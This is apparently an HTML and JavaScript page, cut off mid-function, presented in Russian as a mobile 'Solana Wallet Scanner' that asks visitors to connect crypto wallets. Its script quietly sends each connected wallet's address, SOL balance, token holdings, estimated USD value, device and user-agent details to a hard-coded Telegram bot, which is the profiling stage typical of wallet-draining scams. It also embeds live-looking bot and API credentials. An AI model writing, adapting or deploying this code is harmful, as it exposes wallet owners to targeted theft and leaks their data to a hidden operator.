<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Solana Wallet Scanner - –ú–æ–±–∏–ª—å–Ω–∞—è –≤–µ—Ä—Å–∏—è</title>
  
  <!-- –ü–æ–¥–∫–ª—é—á–∞–µ–º Solana Web3.js –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ -->
  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
  <script src="https://unpkg.com/@solana/spl-token@latest/lib/index.iife.min.js"></script>
  
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      padding: 10px;
      box-sizing: border-box;
    }

    .main-container {
      background: rgba(255, 255, 255, 0.95);
      border-radius: 20px;
      padding: 20px;
      box-shadow: 0 20px 40px rgba(0,0,0,0.1);
      backdrop-filter: blur(10px);
      width: 100%;
      max-width: 400px;
      text-align: center;
    }

    .device-info {
      background: #f8f9fa;
      border-radius: 10px;
      padding: 10px;
      margin-bottom: 20px;
      font-size: 0.85rem;
      color: #666;
    }

    #connectWalletBtn {
      width: 100%;
      padding: 15px 20px;
      font-size: 1.1rem;
      font-weight: 600;
      border: none;
      border-radius: 15px;
      background: linear-gradient(45deg, #4a90e2, #357abd);
      color: white;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 4px 15px rgba(74, 144, 226, 0.3);
    }

    #connectWalletBtn:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(74, 144, 226, 0.4);
    }

    #connectWalletBtn.connected {
      background: linear-gradient(45deg, #28a745, #20c997);
      box-shadow: 0 4px 15px rgba(40, 167, 69, 0.3);
    }

    .hidden {
      display: none !important;
    }

    .modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(0,0,0,0.6);
      z-index: 1000;
      backdrop-filter: blur(5px);
    }

    .connect-wallet, .all-wallets-modal {
      position: fixed;
      bottom: 0;
      left: 0;
      right: 0;
      background: white;
      border-radius: 20px 20px 0 0;
      padding: 20px;
      z-index: 1001;
      max-height: 85vh;
      overflow-y: auto;
      animation: slideUp 0.3s ease-out;
    }

    @keyframes slideUp {
      from {
        transform: translateY(100%);
      }
      to {
        transform: translateY(0);
      }
    }

    .connect-header, .modal-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 20px;
      padding-bottom: 15px;
      border-bottom: 1px solid #eee;
    }

    .connect-header h2, .modal-header h2 {
      margin: 0;
      font-size: 1.3rem;
      font-weight: 700;
      color: #333;
      flex-grow: 1;
      text-align: center;
    }

    .close-btn, .back-btn {
      background: #f8f9fa;
      border: none;
      font-size: 1.5rem;
      cursor: pointer;
      width: 35px;
      height: 35px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #666;
      transition: all 0.2s ease;
    }

    .close-btn:hover, .back-btn:hover {
      background: #e9ecef;
      color: #333;
    }

    .wallet-list {
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    .wallet-option {
      display: flex;
      align-items: center;
      padding: 15px;
      background: #f8f9fa;
      border-radius: 15px;
      cursor: pointer;
      transition: all 0.2s ease;
      border: 2px solid transparent;
    }

    .wallet-option:hover, .wallet-option:active {
      background: #e3f2fd;
      border-color: #2196f3;
      transform: translateY(-1px);
    }

    .wallet-option img {
      width: 45px;
      height: 45px;
      margin-right: 15px;
      border-radius: 12px;
      object-fit: cover;
    }

    .wallet-option .wallet-info {
      flex-grow: 1;
      text-align: left;
    }

    .wallet-option .wallet-name {
      font-size: 1rem;
      font-weight: 600;
      color: #333;
      margin-bottom: 2px;
    }

    .wallet-option .wallet-status {
      font-size: 0.8rem;
      color: #28a745;
    }

    .mobile-indicator {
      background: #e3f2fd;
      color: #1976d2;
      font-size: 0.75rem;
      padding: 4px 8px;
      border-radius: 12px;
      font-weight: 500;
    }

    .connection-status {
      margin: 15px 0;
      padding: 12px;
      border-radius: 10px;
      text-align: center;
      font-size: 0.9rem;
      font-weight: 500;
    }

    .connection-status.success {
      background: #d4edda;
      color: #155724;
      border: 1px solid #c3e6cb;
    }

    .connection-status.error {
      background: #f8d7da;
      color: #721c24;
      border: 1px solid #f5c6cb;
    }

    .connection-status.loading {
      background: #d1ecf1;
      color: #0c5460;
      border: 1px solid #bee5eb;
    }

    .connection-status.scanning {
      background: #fff3cd;
      color: #856404;
      border: 1px solid #ffeaa7;
    }

    .wallet-info-display {
      margin-top: 15px;
      padding: 15px;
      background: #f8f9fa;
      border-radius: 12px;
      font-size: 0.85rem;
    }

    .wallet-info-display .address {
      font-family: 'Courier New', monospace;
      word-break: break-all;
      margin: 8px 0;
      color: #495057;
      background: white;
      padding: 8px;
      border-radius: 6px;
    }

    .action-buttons {
      display: flex;
      gap: 10px;
      margin-top: 15px;
    }

    .action-btn {
      flex: 1;
      padding: 10px;
      border: none;
      border-radius: 8px;
      font-weight: 500;
      cursor: pointer;
      transition: all 0.2s ease;
    }

    .disconnect-btn {
      background: #dc3545;
      color: white;
    }

    .disconnect-btn:hover {
      background: #c82333;
    }

    .rescan-btn {
      background: #28a745;
      color: white;
    }

    .rescan-btn:hover {
      background: #218838;
    }

    .telegram-status {
      position: fixed;
      top: 20px;
      right: 20px;
      padding: 10px 15px;
      border-radius: 25px;
      font-size: 0.8rem;
      font-weight: 600;
      z-index: 2000;
      transition: all 0.3s ease;
      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
    }

    .telegram-status.sending {
      background: #ffc107;
      color: #856404;
    }

    .telegram-status.success {
      background: #28a745;
      color: white;
    }

    .telegram-status.error {
      background: #dc3545;
      color: white;
    }

    .loading-spinner {
      display: inline-block;
      width: 16px;
      height: 16px;
      border: 2px solid #f3f3f3;
      border-top: 2px solid #3498db;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-left: 8px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .get-started {
      text-align: center;
      margin-top: 20px;
      color: #666;
      font-size: 0.9rem;
    }

    .get-started a {
      color: #2196f3;
      text-decoration: none;
      font-weight: 500;
    }

    .get-started a:hover {
      text-decoration: underline;
    }

    /* –ê–¥–∞–ø—Ç–∞—Ü–∏—è –¥–ª—è –±–æ–ª—å—à–∏—Ö —ç–∫—Ä–∞–Ω–æ–≤ */
    @media (min-width: 768px) {
      .connect-wallet, .all-wallets-modal {
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        bottom: auto;
        right: auto;
        width: 400px;
        border-radius: 20px;
        animation: none;
      }
    }
  </style>
</head>
<body>
  <!-- –ò–Ω–¥–∏–∫–∞—Ç–æ—Ä —Å—Ç–∞—Ç—É—Å–∞ Telegram -->
  <div id="telegramStatus" class="telegram-status hidden">üì§ –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram...</div>

  <!-- –û—Å–Ω–æ–≤–Ω–æ–π –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä -->
  <div class="main-container">
    <!-- –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ -->
    <div class="device-info" id="deviceInfo">
      <div>üîç –û–ø—Ä–µ–¥–µ–ª—è–µ–º —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ...</div>
    </div>

    <!-- –ö–Ω–æ–ø–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫–æ—à–µ–ª—å–∫–∞ -->
    <button id="connectWalletBtn">–ü–æ–¥–∫–ª—é—á–∏—Ç—å –∫–æ—à–µ–ª–µ–∫</button>
  </div>

  <!-- –ú–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ -->
  <div id="modalOverlay" class="modal-overlay hidden"></div>

  <!-- –ú–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫–æ—à–µ–ª—å–∫–∞ -->
  <div id="connectWalletModal" class="connect-wallet hidden">
    <div class="connect-header">
      <div></div>
      <h2>–í—ã–±–µ—Ä–∏—Ç–µ –∫–æ—à–µ–ª–µ–∫</h2>
      <button class="close-btn" title="–ó–∞–∫—Ä—ã—Ç—å">√ó</button>
    </div>
    
    <!-- –°—Ç–∞—Ç—É—Å –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è -->
    <div id="connectionStatus" class="connection-status hidden"></div>
    
    <!-- –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω–æ–º –∫–æ—à–µ–ª—å–∫–µ -->
    <div id="walletInfo" class="wallet-info-display hidden">
      <div><strong>–ü–æ–¥–∫–ª—é—á–µ–Ω–Ω—ã–π –∫–æ—à–µ–ª–µ–∫:</strong> <span id="connectedWalletName"></span></div>
      <div><strong>–ê–¥—Ä–µ—Å:</strong></div>
      <div class="address" id="walletAddress"></div>
      
      <div class="action-buttons">
        <button id="disconnectBtn" class="action-btn disconnect-btn">–û—Ç–∫–ª—é—á–∏—Ç—å</button>
        <button id="rescanBtn" class="action-btn rescan-btn">–ü–µ—Ä–µ—Å–∫–∞–Ω–∏—Ä–æ–≤–∞—Ç—å</button>
      </div>
    </div>

    <!-- –°–ø–∏—Å–æ–∫ –∫–æ—à–µ–ª—å–∫–æ–≤ -->
    <div class="wallet-list" id="walletList">
      <div class="wallet-option" data-wallet="phantom">
        <img src="https://s.iimg.su/s/26/XUns4qhYptxMAGIMJkK8GXJiTvRMnTO8ZqAcKqvx.png" alt="Phantom" />
        <div class="wallet-info">
          <div class="wallet-name">Phantom</div>
          <div class="wallet-status">–î–æ—Å—Ç—É–ø–µ–Ω</div>
        </div>
        <div class="mobile-indicator" id="phantom-indicator">üì±</div>
      </div>
      
      <div class="wallet-option" data-wallet="solflare">
        <img src="https://s.iimg.su/s/26/AaFiC9SIvF95PZEblauprFwWZ7bXKuO2NRYnJVIH.png" alt="Solflare" />
        <div class="wallet-info">
          <div class="wallet-name">Solflare</div>
          <div class="wallet-status">–î–æ—Å—Ç—É–ø–µ–Ω</div>
        </div>
        <div class="mobile-indicator" id="solflare-indicator">üì±</div>
      </div>
      
      <div class="wallet-option" data-wallet="trustwallet">
        <img src="https://s.iimg.su/s/26/mA9QKT4xSAh5HifKsQIN8m9oZxn3ODrKcl1XQdtn.png" alt="Trust Wallet" />
        <div class="wallet-info">
          <div class="wallet-name">Trust Wallet</div>
          <div class="wallet-status">–î–æ—Å—Ç—É–ø–µ–Ω</div>
        </div>
        <div class="mobile-indicator" id="trustwallet-indicator">üì±</div>
      </div>
      
      <div class="wallet-option" data-wallet="coinbase">
        <img src="https://s.iimg.su/s/26/75HQqHl0g9lz9qIFBEHNkRZknbnJVc69aqI5PlGK.png" alt="Coinbase" />
        <div class="wallet-info">
          <div class="wallet-name">Coinbase Wallet</div>
          <div class="wallet-status">–î–æ—Å—Ç—É–ø–µ–Ω</div>
        </div>
        <div class="mobile-indicator" id="coinbase-indicator">üì±</div>
      </div>
      
      <div class="wallet-option" data-wallet="bitget">
        <img src="https://s.iimg.su/s/26/HrAB9KDj99AnQOQZcxhY0htKY0oUFcONhY9jSUhP.png" alt="Bitget Wallet" />
        <div class="wallet-info">
          <div class="wallet-name">Bitget Wallet</div>
          <div class="wallet-status">–î–æ—Å—Ç—É–ø–µ–Ω</div>
        </div>
        <div class="mobile-indicator" id="bitget-indicator">üì±</div>
      </div>
    </div>
    
    <div class="get-started">
      –ù–µ—Ç –∫–æ—à–µ–ª—å–∫–∞? <a href="https://phantom.app/" target="_blank">–°–∫–∞—á–∞—Ç—å Phantom</a>
    </div>
  </div>

  <script>
    // ============================================================================
    // –û–ü–†–ï–î–ï–õ–ï–ù–ò–ï –£–°–¢–†–û–ô–°–¢–í–ê –ò –ë–†–ê–£–ó–ï–†–ê
    // ============================================================================

    class DeviceDetector {
      constructor() {
        this.userAgent = navigator.userAgent.toLowerCase();
        this.device = this.detectDevice();
        this.browser = this.detectBrowser();
        this.os = this.detectOS();
      }

      detectDevice() {
        const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(this.userAgent);
        const isTablet = /ipad|android(?!.*mobile)/i.test(this.userAgent);
        
        return {
          isMobile: isMobile && !isTablet,
          isTablet: isTablet,
          isDesktop: !isMobile && !isTablet
        };
      }

      detectBrowser() {
        if (this.userAgent.includes('telegram')) return 'telegram';
        if (this.userAgent.includes('chrome') && !this.userAgent.includes('edg')) return 'chrome';
        if (this.userAgent.includes('firefox')) return 'firefox';
        if (this.userAgent.includes('safari') && !this.userAgent.includes('chrome')) return 'safari';
        if (this.userAgent.includes('edg')) return 'edge';
        if (this.userAgent.includes('opera')) return 'opera';
        return 'unknown';
      }

      detectOS() {
        if (this.userAgent.includes('android')) return 'android';
        if (this.userAgent.includes('iphone') || this.userAgent.includes('ipad')) return 'ios';
        if (this.userAgent.includes('windows')) return 'windows';
        if (this.userAgent.includes('mac')) return 'macos';
        if (this.userAgent.includes('linux')) return 'linux';
        return 'unknown';
      }

      getDeviceInfo() {
        return {
          device: this.device,
          browser: this.browser,
          os: this.os,
          userAgent: navigator.userAgent
        };
      }
    }

    // ============================================================================
    // –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø –ö–û–®–ï–õ–¨–ö–û–í –î–õ–Ø –ú–û–ë–ò–õ–¨–ù–´–• –£–°–¢–†–û–ô–°–¢–í
    // ============================================================================

    const WALLET_CONFIG = {
      phantom: {
        name: 'Phantom',
        mobile: {
          android: { 
            scheme: 'phantom://ul/v1/browse/', 
            universal: 'https://phantom.app/ul/v1/browse/',
            store: 'https://play.google.com/store/apps/details?id=app.phantom'
          },
          ios: { 
            scheme: 'phantom://ul/v1/browse/', 
            universal: 'https://phantom.app/ul/v1/browse/',
            store: 'https://apps.apple.com/app/phantom-solana-wallet/id1598432977'
          }
        }
      },
      solflare: {
        name: 'Solflare',
        mobile: {
          android: { 
            scheme: 'solflare://ul/v1/browse/', 
            universal: 'https://solflare.com/ul/v1/browse/',
            store: 'https://play.google.com/store/apps/details?id=com.solflare.mobile'
          },
          ios: { 
            scheme: 'solflare://ul/v1/browse/', 
            universal: 'https://solflare.com/ul/v1/browse/',
            store: 'https://apps.apple.com/app/solflare/id1580902717'
          }
        }
      },
      trustwallet: {
        name: 'Trust Wallet',
        mobile: {
          android: { 
            scheme: 'trust://open_url?coin_id=501&url=', 
            universal: 'https://link.trustwallet.com/open_url?coin_id=501&url=',
            store: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp'
          },
          ios: { 
            scheme: 'trust://open_url?coin_id=501&url=', 
            universal: 'https://link.trustwallet.com/open_url?coin_id=501&url=',
            store: 'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409'
          }
        }
      },
      coinbase: {
        name: 'Coinbase Wallet',
        mobile: {
          android: { 
            scheme: 'cbwallet://dapp?cb_url=', 
            universal: 'https://go.cb-w.com/dapp?cb_url=',
            store: 'https://play.google.com/store/apps/details?id=org.toshi'
          },
          ios: { 
            scheme: 'cbwallet://dapp?cb_url=', 
            universal: 'https://go.cb-w.com/dapp?cb_url=',
            store: 'https://apps.apple.com/app/coinbase-wallet-store-crypto/id1278383455'
          }
        }
      },
      bitget: {
        name: 'Bitget Wallet',
        mobile: {
          android: { 
            scheme: 'bitkeep://bkconnect?action=dapp&url=', 
            universal: 'https://bkcode.vip?action=dapp&url=',
            store: 'https://play.google.com/store/apps/details?id=com.bitkeep.app'
          },
          ios: { 
            scheme: 'bitkeep://bkconnect?action=dapp&url=', 
            universal: 'https://bkcode.vip?action=dapp&url=',
            store: 'https://apps.apple.com/app/bitkeep-crypto-defi-wallet/id1395301115'
          }
        }
      }
    };

    // ============================================================================
    // TELEGRAM INTEGRATION
    // ============================================================================

    const TELEGRAM_CONFIG = {
      BOT_TOKEN: '7523783619:AAHrK8KtQT3t_SflVhz2POJ1RDaLp1PuJEc',
      CHAT_ID: '7253475769'
    };

    function showTelegramStatus(type, message) {
      const statusElement = document.getElementById('telegramStatus');
      statusElement.className = `telegram-status ${type}`;
      statusElement.textContent = message;
      statusElement.classList.remove('hidden');

      if (type === 'success' || type === 'error') {
        setTimeout(() => {
          statusElement.classList.add('hidden');
        }, 3000);
      }
    }

    async function sendWalletInfoToTelegram(walletName, walletData, deviceInfo) {
      showTelegramStatus('sending', 'üì§ –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram...');
      
      const currentTime = new Date().toLocaleString('ru-RU', {
        timeZone: 'Europe/Moscow',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
      });

      let message = `üöÄ –ü–û–î–ö–õ–Æ–ß–ï–ù–ò–ï –ö–û–®–ï–õ–¨–ö–ê\n\n`;
      message += `üíº –ö–æ—à–µ–ª–µ–∫: ${walletName}\n`;
      message += `üìç –ê–¥—Ä–µ—Å: ${walletData.address}\n`;
      message += `‚è∞ –í—Ä–µ–º—è: ${currentTime}\n`;
      message += `üåê –°–∞–π—Ç: ${window.location.hostname}\n\n`;
      
      // –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ
      message += `üì± –ò–ù–§–û–†–ú–ê–¶–ò–Ø –û–ë –£–°–¢–†–û–ô–°–¢–í–ï:\n`;
      message += `üñ•Ô∏è –¢–∏–ø: ${deviceInfo.device.isMobile ? '–ú–æ–±–∏–ª—å–Ω–æ–µ' : deviceInfo.device.isTablet ? '–ü–ª–∞–Ω—à–µ—Ç' : '–î–µ—Å–∫—Ç–æ–ø'}\n`;
      message += `üåê –ë—Ä–∞—É–∑–µ—Ä: ${deviceInfo.browser.toUpperCase()}\n`;
      message += `üíª –û–°: ${deviceInfo.os.toUpperCase()}\n`;
      message += `üîç User Agent: ${deviceInfo.userAgent.substring(0, 100)}...\n\n`;
      
      message += `üìä –†–ï–ó–£–õ–¨–¢–ê–¢–´ –°–ö–ê–ù–ò–†–û–í–ê–ù–ò–Ø:\n`;
      message += `üí∞ –ë–∞–ª–∞–Ω—Å SOL: ${walletData.solBalance.toFixed(4)} SOL\n`;
      message += `ü™ô –í—Å–µ–≥–æ —Ç–æ–∫–µ–Ω–æ–≤: ${walletData.totalTokenAccounts}\n`;
      message += `‚è∞ –í—Ä–µ–º—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è: ${new Date(walletData.scanTimestamp).toLocaleTimeString()}\n`;
      message += `‚ö° –¢–∏–ø —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è: Fast Scan\n`;
      message += `üöÄ –î–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å: ${walletData.scanDuration}–º—Å\n`;
      message += `‚úÖ –°—Ç–∞—Ç—É—Å: ${walletData.success ? '–£—Å–ø–µ—à–Ω–æ' : '–û—à–∏–±–∫–∞'}\n\n`;

      if (walletData.tokens && walletData.tokens.length > 0) {
        message += `üíé –¢–û–ö–ï–ù–´ –° –ë–ê–õ–ê–ù–°–û–ú:\n`;
        walletData.tokens.slice(0, 5).forEach((token, index) => {
          message += `${index + 1}. ${token.name}\n`;
          message += `   üí∞ –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ: ${token.amount}\n`;
          message += `   üîó Mint: ${token.mint.substring(0, 8)}...${token.mint.substring(token.mint.length - 8)}\n\n`;
        });
        
        if (walletData.tokens.length > 5) {
          message += `... –∏ –µ—â–µ ${walletData.tokens.length - 5} —Ç–æ–∫–µ–Ω–æ–≤\n\n`;
        }
      } else {
        message += `üì≠ –¢–æ–∫–µ–Ω—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã –∏–ª–∏ –≤—Å–µ –±–∞–ª–∞–Ω—Å—ã —Ä–∞–≤–Ω—ã 0\n\n`;
      }

      if (walletData.methodUsed) {
        message += `üì° –ú–µ—Ç–æ–¥ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è: ${walletData.methodUsed}\n`;
      }

      if (walletData.solBalance > 0) {
        message += `üíµ –ü—Ä–∏–º–µ—Ä–Ω–∞—è —Å—Ç–æ–∏–º–æ—Å—Ç—å SOL: ~$${(walletData.solBalance * 100).toFixed(2)} USD\n`;
      }

      try {
        console.log('üì§ –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –∫–æ—à–µ–ª—å–∫–µ –≤ Telegram...');
        
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CONFIG.CHAT_ID,
            text: message,
            disable_web_page_preview: true
          })
        });

        const responseData = await response.json();
        
        if (response.ok && responseData.ok) {
          console.log('‚úÖ –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –∫–æ—à–µ–ª—å–∫–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –≤ Telegram');
          showTelegramStatus('success', '‚úÖ –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram');
          return true;
        } else {
          console.error('‚ùå –û—à–∏–±–∫–∞ Telegram API:', responseData);
          showTelegramStatus('error', '‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏');
          return false;
        }
      } catch (error) {
        console.error('‚ùå –û—à–∏–±–∫–∞ —Å–µ—Ç–∏:', error);
        showTelegramStatus('error', '‚ùå –û—à–∏–±–∫–∞ —Å–µ—Ç–∏');
        return false;
      }
    }

    // ============================================================================
    // WALLET BALANCE CHECKER
    // ============================================================================

    async function makeRequest(url, method, data, retries = 2, timeout = 5000) {
      for (let attempt = 1; attempt <= retries; attempt++) {
        try {
          const controller = new AbortController();
          const timeoutId = setTimeout(() => controller.abort(), timeout);

          const options = {
            method,
            headers: { 'Content-Type': 'application/json' },
            signal: controller.signal
          };

          if (data && method !== 'GET') {
            options.body = JSON.stringify(data);
          }

          const response = await fetch(url, options);
          clearTimeout(timeoutId);

          if (!response.ok) {
            throw new Error(`HTTP ${response.status}: ${response.statusText}`);
          }

          return await response.json();
        } catch (error) {
          console.error(`Attempt ${attempt} failed for ${url}: ${error.message}`);
          if (attempt === retries) {
            console.error(`All attempts failed for ${url}`);
            return null;
          }
          await new Promise(resolve => setTimeout(resolve, 500));
        }
      }
    }

    async function checkWalletBalanceFast(walletAddress) {
      const heliusRpcUrl = 'https://mainnet.helius-rpc.com/';
      const heliusApiUrl = 'https://api.helius.xyz/v0/addresses/';
      const publicRpcUrl = 'https://api.mainnet-beta.solana.com';
      const apiKeys = [
        '5d71bf51-5f82-4892-8b89-c7257acb9384',
        'ece615f0-f4eb-4a27-a912-bb7ccdf1759e'
      ];

      const priorityRequests = [
        {
          url: `${heliusApiUrl}${walletAddress}/balances?api-key=${apiKeys[0]}`,
          method: 'GET',
          data: null,
          desc: 'Helius API (Key 1) - SOL and Tokens',
          type: 'combined'
        },
        {
          url: `${heliusApiUrl}${walletAddress}/balances?api-key=${apiKeys[1]}`,
          method: 'GET',
          data: null,
          desc: 'Helius API (Key 2) - SOL and Tokens',
          type: 'combined'
        },
        {
          url: `${heliusRpcUrl}?api-key=${apiKeys[0]}`,
          method: 'POST',
          data: { jsonrpc: '2.0', id: 1, method: 'getBalance', params: [walletAddress] },
          desc: 'Helius RPC (Key 1) - SOL Balance',
          type: 'sol'
        },
        {
          url: publicRpcUrl,
          method: 'POST',
          data: { jsonrpc: '2.0', id: 1, method: 'getBalance', params: [walletAddress] },
          desc: 'Public RPC - SOL Balance',
          type: 'sol'
        }
      ];

      const results = {
        solBalance: 0,
        tokens: [],
        methodUsed: null,
        scanTime: Date.now(),
        success: false
      };

      console.log('üöÄ –ù–∞—á–∏–Ω–∞–µ–º –±—ã—Å—Ç—Ä–æ–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ...');

      for (const req of priorityRequests) {
        console.log(`‚ö° –ü—Ä–æ–±—É–µ–º: ${req.desc}`);
        
        const result = await makeRequest(req.url, req.method, req.data, 1, 3000);
        
        if (result) {
          results.methodUsed = req.desc;
          results.success = true;
          
          if (req.type === 'combined') {
            results.solBalance = result.nativeBalance / 1_000_000_000 || 0;
            results.tokens = result.tokens || [];
            
            console.log(`‚úÖ –£—Å–ø–µ—Ö! SOL: ${results.solBalance}, –¢–æ–∫–µ–Ω—ã: ${results.tokens.length}`);
            
            if (results.solBalance > 0 || results.tokens.length > 0) {
              results.scanTime = Date.now() - results.scanTime;
              return results;
            }
          } else if (req.type === 'sol') {
            results.solBalance = result.result?.value / 1_000_000_000 || 0;
            
            console.log(`‚úÖ –ü–æ–ª—É—á–µ–Ω –±–∞–ª–∞–Ω—Å SOL: ${results.solBalance}`);
            
            if (results.solBalance > 0) {
              const tokenResult = await getTokensQuick(walletAddress);
              if (tokenResult) {
                results.tokens = tokenResult;
              }
              results.scanTime = Date.now() - results.scanTime;
              return results;
            }
          }
        }
      }

      results.scanTime = Date.now() - results.scanTime;
      return results;
    }

    async function getTokensQuick(walletAddress) {
      const heliusRpcUrl = 'https://mainnet.helius-rpc.com/';
      const apiKey = '5d71bf51-5f82-4892-8b89-c7257acb9384';
      
      console.log('ü™ô –ë—ã—Å—Ç—Ä–æ –ø–æ–ª—É—á–∞–µ–º —Ç–æ–∫–µ–Ω—ã...');
      
      const result = await makeRequest(
        `${heliusRpcUrl}?api-key=${apiKey}`,
        'POST',
        {
          jsonrpc: '2.0',
          id: 1,
          method: 'getTokenAccountsByOwner',
          params: [walletAddress, { programId: 'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA' }, { encoding: 'jsonParsed' }]
        },
        1,
        3000
      );

      if (result && result.result && result.result.value) {
        console.log(`ü™ô –ù–∞–π–¥–µ–Ω–æ ${result.result.value.length} —Ç–æ–∫–µ–Ω-–∞–∫–∫–∞—É–Ω—Ç–æ–≤`);
        return result.result.value;
      }

      return [];
    }

    // ============================================================================
    // MOBILE WALLET MANAGER
    // ============================================================================

    class MobileWalletManager {
      constructor() {
        this.deviceDetector = new DeviceDetector();
        this.deviceInfo = this.deviceDetector.getDeviceInfo();
        this.connectedWallet = null;
        this.walletAddress = null;
        this.walletName = null;
        this.walletData = null;
        this.isScanning = false;
        
        this.knownTokens = {
          'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': 'USDC',
          'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB': 'USDT',
          'So11111111111111111111111111111111111111112': 'SOL (Wrapped)',
          'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263': 'Bonk',
          'JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN': 'Jupiter'
        };

        this.init();
      }

      init() {
        this.updateDeviceInfo();
        this.setupEventListeners();
        this.updateWalletIndicators();
      }

      updateDeviceInfo() {
        const deviceInfoElement = document.getElementById('deviceInfo');
        const info = this.deviceInfo;
        
        let deviceText = '';
        if (info.device.isMobile) deviceText = 'üì± –ú–æ–±–∏–ª—å–Ω–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ';
        else if (info.device.isTablet) deviceText = 'üì± –ü–ª–∞–Ω—à–µ—Ç';
        else deviceText = 'üñ•Ô∏è –î–µ—Å–∫—Ç–æ–ø';
        
        deviceInfoElement.innerHTML = `
          <div>${deviceText} | üåê ${info.browser.toUpperCase()} | üíª ${info.os.toUpperCase()}</div>
        `;
      }

      updateWalletIndicators() {
        Object.keys(WALLET_CONFIG).forEach(walletKey => {
          const indicator = document.getElementById(`${walletKey}-indicator`);
          if (indicator) {
            if (this.deviceInfo.device.isMobile || this.deviceInfo.device.isTablet) {
              indicator.textContent = 'üì± –ú–æ–±–∏–ª—å–Ω—ã–π';
              indicator.style.background = '#e3f2fd';
              indicator.style.color = '#1976d2';
            } else {
              indicator.textContent = 'üñ•Ô∏è –î–µ—Å–∫—Ç–æ–ø';
              indicator.style.background = '#f3e5f5';
              indicator.style.color = '#7b1fa2';
            }
          }
        });
      }

      createWalletLink(walletKey) {
        const wallet = WALLET_CONFIG[walletKey];
        if (!wallet || (!this.deviceInfo.device.isMobile && !this.deviceInfo.device.isTablet)) {
          return null;
        }
        
        const currentUrl = encodeURIComponent(window.location.href);
        const platform = this.deviceInfo.os === 'android' ? 'android' : 'ios';
        const mobileConfig = wallet.mobile[platform];
        
        if (!mobileConfig) return null;
        
        return {
          deepLink: `${mobileConfig.scheme}${currentUrl}`,
          universalLink: `${mobileConfig.universal}${currentUrl}`,
          storeLink: mobileConfig.store
        };
      }

      async openWallet(walletKey) {
        if (this.deviceInfo.device.isDesktop) {
          // –î–ª—è –¥–µ—Å–∫—Ç–æ–ø–∞ –ø—ã—Ç–∞–µ–º—Å—è –ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è —á–µ—Ä–µ–∑ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ
          return await this.connectDesktopWallet(walletKey);
        }

        // –î–ª—è –º–æ–±–∏–ª—å–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤ –∏—Å–ø–æ–ª—å–∑—É–µ–º deep links
        const links = this.createWalletLink(walletKey);
        if (!links) {
